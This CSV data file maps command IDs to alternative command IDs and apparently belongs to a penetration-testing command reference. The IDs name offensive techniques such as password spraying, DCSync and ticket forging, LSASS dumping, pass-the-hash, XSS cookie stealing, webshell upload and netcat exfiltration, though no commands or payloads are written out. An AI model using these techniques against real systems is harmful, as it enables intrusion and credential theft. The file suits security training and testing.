"command_id","alternative_command_id"
"ft-scp-download","ft-nc-send"
"ft-wget-download","ft-curl-download"
"ft-wget-download","ft-bash-dev-tcp"
"ft-curl-download","ft-wget-download"
"ft-curl-download","ft-bash-dev-tcp"
"ft-bash-dev-tcp","ft-wget-download"
"ft-bash-dev-tcp","ft-curl-download"
"ft-python-http-server","php-http-server"
"ft-python-http-server","ruby-http-server"
"ft-smb-server","ft-python-http-server"
"ft-uploadserver","ft-smb-server"
"ft-uploadserver","ft-nc-receive"
"lsof-network-all","netstat-listening-tcp"
"lsof-network-all","ss-listening-all"
"lsof-listening-ports","netstat-listening-tcp"
"lsof-listening-ports","ss-listening-ports"
"lsof-port-specific","fuser-port-tcp"
"fuser-port-tcp","lsof-port-specific"
"netstat-listening-tcp","ss-listening-all"
"netstat-listening-tcp","lsof-listening-ports"
"ss-listening-all","netstat-listening-tcp"
"ss-listening-all","lsof-listening-ports"
"win-netstat-process-mapping","win-ps-netstat-process"
"win-ps-netstat-process","win-netstat-process-mapping"
"win-tasklist-pid","win-wmic-process-pid"
"win-tasklist-pid","win-ps-get-process"
"win-wmic-process-pid","win-tasklist-pid"
"systemctl-running-services","service-status-all-sysv"
"service-status-all-sysv","systemctl-running-services"
"win-sc-query-services","win-wmic-service-full"
"win-sc-query-services","win-ps-get-service"
"win-sc-query-all","win-wmic-service-full"
"win-sc-query-all","get-service"
"win-sc-query-config","win-wmic-service-path"
"win-wmic-service-full","win-sc-query-all"
"win-wmic-service-full","win-ps-get-service"
"win-wmic-service-path","win-sc-query-config"
"win-wmic-service-path","win-unquoted-service-paths"
"win-ps-get-service","win-sc-query-services"
"win-ps-get-service","win-wmic-service-full"
"win-ps-get-service-details","win-wmic-service-path"
"win-ps-get-service-details","win-sc-query-config"
"ps-grep-pattern","ps-aux-full"
"ps-grep-pattern","ps-grep-pattern"
"ps-grep-extract-pid","ps-grep-pattern"
"crontab-user-direct-read","crontab-user-list"
"less-etc-crontab","crontab-system-wide"
"tail-follow-syslog","journalctl-follow"
"journalctl-kernel-messages","dmesg-kernel-messages"
"journalctl-kernel-follow","dmesg-follow"
"ls-init-d","systemctl-list"
"top-snapshot-batch","ps-aux-full"
"ls-proc-fd-all","lsof-list"
"lsof-directory-non-recursive","lsof-directory-usage"
"crontab-system-wide","less-etc-crontab"
"win-schtasks-list-all","win-ps-scheduled-tasks"
"win-schtasks-list-all","get-scheduledtask"
"win-ps-scheduled-tasks","win-schtasks-list-all"
"tail-follow-log","tail-follow-multiple"
"tail-follow-log","journalctl-follow"
"journalctl-follow","tail-follow-log"
"grep-auth-failed","lastb-failed-logins"
"lastb-failed-logins","grep-auth-failed"
"journalctl-boot-messages","dmesg-kernel-messages"
"systemctl-list","service --status-all"
"systemctl-list","chkconfig --list"
"systemctl-list","ls-init-d"
"lsof-list","netstat -tulpn"
"lsof-list","ss -tulpn"
"lsof-list","ls-proc-fd-all"
"lsof-list","netstat-listening-ports"
"free-memory-human","cat-proc-meminfo"
"uptime-load-average","cat-proc-loadavg"
"lsof-directory-usage","fuser-directory-processes"
"fuser-directory-processes","lsof-directory-usage"
"who-logged-in","w-user-activity"
"lastlog-user-last","last-login-history"
"ps-aux-full","ps-ef-full"
"ps-aux-full","top-snapshot"
"ps-aux-full","pstree-hierarchy"
"ps-auxww-no-truncate","ps-ef-full"
"ps-ef-full","ps-aux-full"
"ps-ef-full","pstree-hierarchy"
"pstree-hierarchy","ps-ef-full"
"top-snapshot","ps-sort-cpu"
"win-tasklist-verbose","win-wmic-process-full"
"win-tasklist-verbose","win-ps-get-process"
"win-tasklist-services","win-wmic-service-full"
"win-tasklist-services","win-ps-get-service"
"win-wmic-process-full","win-ps-get-process-detailed"
"win-wmic-process-full","win-tasklist-verbose"
"win-ps-get-process","win-tasklist-verbose"
"win-ps-get-process","win-wmic-process-full"
"win-ps-get-process-detailed","win-wmic-process-full"
"import-powerview","import-sharphound"
"import-powerview","ldapsearch-ad"
"get-netdomain","ldapsearch-dump"
"get-netuser","net-user-domain-list"
"get-netuser","ps-ldapsearch-users"
"get-netuser","get-aduser"
"get-netgroup","net-group-domain-list"
"get-netgroup","ps-ldapsearch-groups"
"get-netgroup","get-adgroup"
"get-netcomputer","get-adcomputer"
"get-netcomputer","ps-ldapsearch-computers"
"invoke-sharefinder","smb-crackmapexec-shares"
"invoke-sharefinder","smb-enum"
"invoke-sharefinder","net-view-shares"
"get-netgpo","get-netgpo"
"get-domainsid","get-domainsid"
"kerbrute-userenum-ad","enum4linux-users-ad"
"kerbrute-userenum-ad","ldapsearch-users-ad"
"crackmapexec-rid-cycling","kerbrute-userenum-ad"
"crackmapexec-rid-cycling","enum4linux-users-ad"
"crackmapexec-rid-cycling","ldapsearch-users-ad"
"ldapsearch-users-ad","kerbrute-userenum-ad"
"ldapsearch-users-ad","enum4linux-users-ad"
"ldapsearch-users-ad","crackmapexec-rid-cycling"
"enum4linux-users-ad","kerbrute-userenum-ad"
"enum4linux-users-ad","crackmapexec-rid-cycling"
"enum4linux-users-ad","ldapsearch-users-ad"
"spray-passwords-ldap","crackmapexec-smb-spray"
"spray-passwords-ldap","kerbrute-passwordspray"
"spray-passwords-ldap","crackmapexec-winrm-spray"
"crackmapexec-smb-spray","spray-passwords-ldap"
"crackmapexec-smb-spray","kerbrute-passwordspray"
"crackmapexec-smb-spray","crackmapexec-winrm-spray"
"kerbrute-passwordspray","spray-passwords-ldap"
"kerbrute-passwordspray","crackmapexec-smb-spray"
"kerbrute-passwordspray","crackmapexec-winrm-spray"
"crackmapexec-winrm-spray","crackmapexec-smb-spray"
"crackmapexec-winrm-spray","spray-passwords-ldap"
"crackmapexec-winrm-spray","kerbrute-passwordspray"
"ad-dcsync-mimikatz-user","ad-dcsync-secretsdump-user"
"ad-dcsync-mimikatz-krbtgt","ad-dcsync-secretsdump-user"
"ad-dcsync-mimikatz-administrator","ad-dcsync-secretsdump-user"
"ad-dcsync-mimikatz-administrator","ad-dcsync-mimikatz-user"
"ad-golden-ticket-dcsync-krbtgt","ad-golden-ticket-lsa-dump-krbtgt"
"ad-golden-ticket-lsa-dump-krbtgt","ad-golden-ticket-dcsync-krbtgt"
"ad-golden-ticket-purge-tickets","kerberos-klist-purge"
"ad-golden-ticket-mimikatz-create","ad-golden-ticket-rubeus-create"
"ad-golden-ticket-rubeus-create","ad-golden-ticket-mimikatz-create"
"ad-golden-ticket-verify-klist","rubeus-klist-display"
"impacket-getnpusers-asreproast","rubeus-asreproast"
"impacket-getnpusers-asreproast","impacket-getnpusers-identify"
"impacket-getnpusers-identify","powerview-asreproast-identify"
"rubeus-asreproast","impacket-getnpusers-asreproast"
"powerview-asreproast-identify","impacket-getnpusers-identify"
"enter-pssession","invoke-command"
"invoke-command","enter-pssession"
"test-admin-share-access","net-use-admin-share"
"test-admin-share-access","dir-admin-share"
"copy-file-admin-share","copy-file-admin-share"
"ad-check-vss-service","ad-dcsync-ntds-credentials"
"ad-vssadmin-create-shadow","ad-vshadow-create-shadow"
"ad-vssadmin-create-shadow","ad-diskshadow-create-shadow"
"ad-vshadow-create-shadow","ad-vssadmin-create-shadow"
"ad-vshadow-create-shadow","ad-diskshadow-create-shadow"
"ad-diskshadow-create-shadow","ad-vssadmin-create-shadow"
"ad-diskshadow-create-shadow","ad-vshadow-create-shadow"
"ad-wmic-create-shadow","ad-vssadmin-create-shadow"
"ad-wmic-create-shadow","ad-vshadow-create-shadow"
"ad-wmic-create-shadow","ad-diskshadow-create-shadow"
"ad-dcsync-mimikatz-single-user","ad-dcsync-impacket-secretsdump-user"
"ad-dcsync-mimikatz-single-user","ad-dcsync-mimikatz-user"
"ad-dcsync-impacket-secretsdump-user","ad-dcsync-mimikatz-single-user"
"ad-dcsync-impacket-secretsdump-user","ad-dcsync-impacket-secretsdump-user"
"ad-dcsync-check-domain-admins","ad-dcsync-check-user-groups"
"ad-dcsync-check-domain-admins","ad-dcsync-check-replication-rights"
"ad-dcsync-check-user-groups","ad-dcsync-check-domain-admins"
"ad-dcsync-check-user-groups","ad-dcsync-check-replication-rights"
"ad-dcsync-check-replication-rights","ad-dcsync-check-domain-admins"
"ad-dcsync-check-replication-rights","ad-dcsync-check-user-groups"
"crackmapexec-validate-admin","kerbrute-validate-creds"
"crackmapexec-validate-admin","pth-evil-winrm"
"crackmapexec-validate-admin","ftp-connect"
"kerbrute-validate-creds","crackmapexec-validate-admin"
"kerbrute-validate-creds","ftp-connect"
"kerbrute-validate-creds","pth-evil-winrm"
"impacket-getuserspns-kerberoast","rubeus-kerberoast"
"impacket-getuserspns-kerberoast","powerview-kerberoast"
"impacket-getuserspns-list","setspn-list-user-spns"
"rubeus-kerberoast","impacket-getuserspns-kerberoast"
"rubeus-kerberoast","powerview-kerberoast"
"rubeus-kerberoast-aes","rubeus-kerberoast"
"powerview-kerberoast","rubeus-kerberoast"
"powerview-kerberoast","impacket-getuserspns-kerberoast"
"setspn-list-user-spns","impacket-getuserspns-list"
"crackmapexec-sam-dump","ad-sam-dump-reg-save"
"download-powerview","curl-download-powerview"
"curl-download-powerview","download-powerview"
"set-executionpolicy-bypass","powershell-ep-bypass-flag"
"powershell-ep-bypass-flag","set-executionpolicy-bypass"
"ad-dcsync-secretsdump-user","ad-dcsync-mimikatz-user"
"ad-dcsync-secretsdump-user","ad-dcsync-secretsdump-all"
"ad-dcsync-secretsdump-krbtgt","ad-dcsync-mimikatz-krbtgt"
"ad-dcsync-secretsdump-all","ad-dcsync-secretsdump-user"
"net-accounts-policy","enum4linux-policy"
"net-accounts-policy","crackmapexec-policy"
"net-accounts-policy","ldapsearch-policy"
"enum4linux-policy","net-accounts-policy"
"enum4linux-policy","crackmapexec-policy"
"enum4linux-policy","ldapsearch-policy"
"crackmapexec-policy","net-accounts-policy"
"crackmapexec-policy","enum4linux-policy"
"crackmapexec-policy","ldapsearch-policy"
"ldapsearch-policy","net-accounts-policy"
"ldapsearch-policy","enum4linux-policy"
"ldapsearch-policy","crackmapexec-policy"
"ad-silver-ticket-mimikatz-create","ad-silver-ticket-rubeus-create"
"ad-silver-ticket-mimikatz-create","overpass-mimikatz-pth"
"ad-silver-ticket-rubeus-create","ad-silver-ticket-mimikatz-create"
"ad-enumerate-spn-target","powerview-enumerate-spns"
"ad-enumerate-spn-target","impacket-getuserspns-list"
"ad-pass-the-hash-crackmapexec","ad-pass-the-hash-impacket-psexec"
"ad-pass-the-hash-crackmapexec","ad-pass-the-hash-impacket-wmiexec"
"ad-pass-the-hash-impacket-psexec","ad-pass-the-hash-impacket-wmiexec"
"ad-pass-the-hash-impacket-psexec","ad-pass-the-hash-crackmapexec"
"ad-pass-the-hash-impacket-wmiexec","ad-pass-the-hash-impacket-psexec"
"ad-pass-the-hash-impacket-wmiexec","ad-pass-the-hash-crackmapexec"
"xss-test-svg-onload","xss-test-body-onload"
"xss-test-svg-onload","xss-test-img-onerror"
"xss-test-svg-onload","xss-test-script-basic"
"xss-test-body-onload","xss-test-svg-onload"
"xss-test-body-onload","xss-test-img-onerror"
"xss-test-body-onload","xss-test-script-basic"
"xss-test-img-onerror","xss-test-svg-onload"
"xss-test-img-onerror","xss-test-body-onload"
"xss-test-img-onerror","xss-test-script-basic"
"xss-test-script-basic","xss-test-img-onerror"
"xss-test-script-basic","xss-test-svg-onload"
"xss-test-script-basic","xss-test-script-context-break"
"xss-test-script-context-break","xss-test-script-basic"
"xss-test-script-context-break","xss-test-event-context-break"
"xss-test-event-context-break","xss-test-script-context-break"
"xss-test-event-context-break","xss-test-img-onerror"
"xss-filter-bypass-case","xss-filter-bypass-encoding"
"xss-filter-bypass-case","xss-test-img-onerror"
"xss-filter-bypass-encoding","xss-filter-bypass-case"
"xss-filter-bypass-encoding","xss-filter-bypass-encoding"
"xss-cookie-stealer","xss-session-hijack-fetch"
"xss-session-hijack-fetch","xss-cookie-stealer"
"sqli-detection-error","sqlmap-post-exploitation"
"sqli-column-enum-orderby","sqlmap-post-exploitation"
"sqli-union-select-basic","sqlmap-post-exploitation"
"sqli-union-mysql-info","sqlmap-post-exploitation"
"sqli-union-postgresql-info","sqlmap-post-exploitation"
"sqli-union-mssql-info","sqlmap-post-exploitation"
"sqlmap-post-exploitation","sqli-detection-error"
"sqlmap-post-exploitation","sqli-column-enum-orderby"
"sqlmap-post-exploitation","sqli-union-select-basic"
"wpscan-enumerate-all","wordpress-manual-version"
"wpscan-enumerate-all","whatweb-enum"
"wpscan-enumerate-all","nikto-scan"
"wpscan-aggressive-detection","wordpress-manual-version"
"wpscan-password-attack","burp-intruder"
"wordpress-manual-version","whatweb-enum"
"wordpress-manual-version","wpscan-enumerate-all"
"curl-ua-poison-apache","lfi-access-log-apache"
"curl-ua-poison-apache","lfi-rce-trigger"
"wfuzz-params","burp-intruder"
"user-registration-test","burpsuite-modify-upload"
"burpsuite-modify-upload","create-php-webshell"
"sqlmap-from-request","sqli-manual-test"
"sqlmap-from-request-level3","sqlmap-from-request"
"sqlmap-enumerate-databases","sqli-union-mysql-info"
"sqlmap-enumerate-tables","sqli-union-mysql-info"
"sqlmap-dump-table","sqli-union-mysql-info"
"curl-wordpress-version-feed","wpscan-enumerate-all"
"powerview-get-netdomain","ps-get-current-domain"
"powerview-get-netdomaincontroller","ps-get-pdc"
"powerview-get-netuser","net-user-domain-list"
"powerview-get-netuser","ps-directorysearcher-users"
"powerview-get-netuser-filter","net-user-domain-detail"
"powerview-get-netuser-spn","setspn-query-all"
"powerview-get-netgroup","net-group-domain-list"
"powerview-get-netgroup","ps-directorysearcher-groups"
"powerview-get-netgroup-specific","net-group-domain-members"
"powerview-get-netgroupmember","powerview-get-netgroup-specific"
"powerview-get-netgroupmember","net-group-domain-members"
"powerview-get-netcomputer","ps-directorysearcher-computers"
"powerview-get-netcomputer","dsquery-computer"
"ps-get-current-domain","get-netdomain"
"ps-get-pdc","net-domain-controllers"
"ps-directorysearcher-users","get-netuser"
"ps-directorysearcher-groups","get-netgroup"
"ps-directorysearcher-computers","get-netcomputer"
"ps-directorysearcher-computers","dsquery-computer"
"ps-ldapsearch-users","get-netuser"
"ps-ldapsearch-computers","get-netcomputer"
"ps-ldapsearch-groups","get-netgroup"
"ps-ldapsearch-spns","get-netuser"
"powerview-get-netsession","psloggedon"
"powerview-get-netloggedon","psloggedon"
"sysinternals-psloggedon","powerview-get-netloggedon"
"net-view-shares","powerview-find-domainshare"
"gpp-password-files","get-gpppassword"
"net-user-domain-list","get-netuser"
"net-group-domain-list","get-netgroup"
"setspn-query-all","get-netuser"
"dsquery-user","net-user-domain-list"
"dsquery-user","get-netuser"
"dsquery-computer","get-netcomputer"
"dsquery-group","net-group-domain-list"
"dsquery-group","get-netgroup"
"net-group-domain-computers","get-netcomputer"
"net-domain-controllers","net-domain-controllers"
"setspn-list-all","get-netuser"
"dsquery-users","get-netuser"
"dsquery-computers","get-netcomputer"
"dsquery-domain-controllers","net-domain-controllers"
"powerview-get-objectacl","get-acl"
"powerview-get-netcomputer-os","get-adcomputer"
"powerview-get-netcomputer-os","crackmapexec-smb-spray"
"query-hkey-users-remote","psloggedon"
"ad-sid-whoami-extract","ad-sid-powerview-domain"
"ad-sid-whoami-extract","ad-sid-wmic-extract"
"ad-sid-powerview-domain","ad-sid-whoami-extract"
"ad-sid-powerview-domain","ad-sid-wmic-extract"
"ad-sid-wmic-extract","ad-sid-whoami-extract"
"ad-sid-wmic-extract","ad-sid-powerview-domain"
"ps-get-group-members-basic","powerview-get-netgroupmember"
"ps-nested-group-check-member-type","powerview-get-netgroupmember"
"ps-nested-group-recursive-function","powerview-get-netgroupmember"
"ps-get-last-nested-user","powerview-get-netuser"
"ps-find-new-domain-admin","powerview-get-netgroupmember"
"powerview-get-domaingroup-recursive","ps-nested-group-recursive-function"
"ps-powerview-get-user-details","ps-get-last-nested-user"
"ps-extract-flag-from-user","ps-get-last-nested-user"
"ps-nested-group-one-liner","powerview-get-domaingroup-recursive"
"nessus-scan","nmap-vuln-scan"
"nessus-scan","nikto-scan"
"nessus-scan","whatweb-enum"
"burp-intruder","wfuzz-params"
"burp-intruder","ffuf-param-fuzz"
"burp-intruder","wfuzz-dir"
"burp-scanner","nikto-scan"
"burp-scanner","sqlmap-basic"
"burp-scanner","wfuzz-params"
"wfuzz-z-file","ffuf-dir-fuzz"
"wfuzz-z-file","gobuster-dir"
"wfuzz-z-file","wfuzz-params"
"wfuzz-post-login-brute","hydra-http-post-form"
"wfuzz-post-login-brute","ffuf-param-fuzz"
"wfuzz-post-login-brute","burp-intruder"
"dirbuster","gobuster-dir"
"dirbuster","ffuf-dir-fuzz"
"masscan-full-tcp","nmap-port-check"
"masscan-full-tcp","nmap-service-scan"
"gpp-decrypt-python-script","get-gpppassword"
"manual-hash-generation-loop","john-show-cracked"
"python-http-server","python-m-simplehttpserver"
"rdesktop-disk-share","smb-server"
"rdesktop-disk-share","scp-transfer"
"ftp-transfer","python-m-simplehttpserver"
"invoke-watson","win-privesc-winpeas"
"find-suid-usr-bin","find-suid-binaries"
"gtfobins-capability-lookup","searchsploit-linux-capability"
"powershell-wget-alias","certutil-download"
"windows-hashcat-crack-ntlm","windows-hashcat-crack-ntlm-file"
"windows-hashcat-crack-ntlm","john-crack-ntlm"
"windows-hashcat-crack-ntlm-file","windows-hashcat-crack-ntlm"
"windows-hashcat-crack-ntlm-file","john-crack-ntlm-rules"
"windows-rdp-xfreerdp","ad-pass-the-hash-impacket-psexec"
"windows-rdp-xfreerdp","evil-winrm-shell"
"linux-kernel-exploit","cat-proc-version"
"linux-nfs-root-squash","showmount-e-localhost"
"linux-systemctl-privesc","getcap-bin-systemctl"
"linux-unix-privesc-check-nc","linux-linpeas-http"
"linux-unix-privesc-check-nc","linux-linpeas-nc"
"linux-unix-privesc-check-nc","linux-suid-find"
"linux-find-world-writable","linux-find-writable-etc-focused"
"linux-find-world-writable","linux-writable-passwd"
"linux-find-world-writable","linux-unix-privesc-check-nc"
"linux-find-writable-etc-focused","linux-find-world-writable"
"linux-find-writable-etc-focused","linux-writable-passwd"
"linux-find-writable-etc-focused","linux-test-file-writable"
"linux-linpeas-http","linux-linpeas-nc"
"linux-linpeas-http","linux-linpeas"
"linux-linpeas-http","linux-unix-privesc-check-nc"
"linux-linpeas-nc","linux-linpeas-http"
"linux-linpeas-nc","linux-linpeas"
"linux-linpeas-nc","linux-unix-privesc-check-nc"
"linux-linpeas-save-output","linux-linpeas-http"
"linux-linpeas-save-output","linux-linpeas"
"linux-linpeas-save-output","linux-parse-linpeas-writable"
"linux-test-file-writable","linux-writable-passwd"
"linux-test-file-writable","linux-find-world-writable"
"linux-test-file-writable","linux-find-writable-etc-focused"
"linux-check-shadow-readable","linux-find-world-writable"
"linux-check-shadow-readable","linux-test-file-writable"
"linux-parse-linpeas-writable","linux-find-world-writable"
"linux-parse-linpeas-writable","linux-find-writable-etc-focused"
"linux-parse-linpeas-writable","linux-linpeas-save-output"
"linux-find-writable-services-systemd","linux-writable-services"
"linux-find-writable-services-systemd","linux-systemctl-privesc"
"invoke-mimikatz-remote","procdump-lsass"
"invoke-mimikatz-remote","comsvcs-lsass-dump"
"procdump-lsass","invoke-mimikatz-remote"
"procdump-lsass","comsvcs-lsass-dump"
"pypykatz-parse","secretsdump-hashes"
"comsvcs-lsass-dump","procdump-lsass"
"comsvcs-lsass-dump","invoke-mimikatz-remote"
"ps-get-process-owner","win-tasklist-verbose"
"file-transfer-certutil","bitsadmin-download"
"exfil-uploadserver","file-transfer-python-http"
"exfil-uploadserver","exfil-smb-upload"
"exfil-powershell-upload","exfil-smb-upload"
"exfil-powershell-upload","exfil-nc-tcp-upload"
"exfil-powershell-upload","exfil-powershell-base64"
"exfil-smb-upload","exfil-powershell-upload"
"exfil-smb-upload","exfil-nc-tcp-upload"
"exfil-nc-tcp-upload","file-transfer-nc-pull"
"exfil-nc-tcp-upload","exfil-powershell-upload"
"exfil-powershell-base64","file-transfer-base64"
"exfil-powershell-base64","exfil-powershell-upload"
"exfil-curl-upload","file-transfer-nc-pull"
"exfil-curl-upload","file-transfer-scp"
"win-unquoted-service-paths","get-unquotedservice"
"win-weak-service-perms","get-modifiableservicefile"
"windows-whoami-privs","whoami-all"
"windows-systeminfo","get-computerinfo"
"windows-service-permissions","sc-sdshow-service"
"windows-kerberoasting","rubeus-kerberoast"
"get-aduser","powerview-get-netuser"
"get-aduser","net-user-domain-list"
"get-aduser","ps-ldapsearch-users"
"get-adgroup","powerview-get-netgroup"
"get-adgroup","net-group-domain-list"
"get-adgroup","ps-ldapsearch-groups"
"get-adgroupmember","powerview-get-netgroupmember"
"get-adgroupmember","net-group-domain-list"
"get-adcomputer","powerview-get-netcomputer"
"get-adcomputer","ps-ldapsearch-computers"
"get-ciminstance","get-wmiobject"
"get-computerinfo","win-systeminfo"
"get-computerinfo","get-ciminstance"
"get-unquotedservice","win-sc-query-services"
"import-module-activedirectory","import-powerview"
"import-module-activedirectory","ldapsearch-ad"
"import-powersploit","import-powerview"
"import-powersploit","import-powerup"
"powershell-runas-basic","fodhelper-uac-bypass"
"powershell-runas-basic","eventvwr-uac-bypass"
"powershell-runas-output-redirect","fodhelper-uac-bypass"
"powershell-runas-output-redirect","eventvwr-uac-bypass"
"powershell-runas-output-redirect","powershell-runas-keepopen"
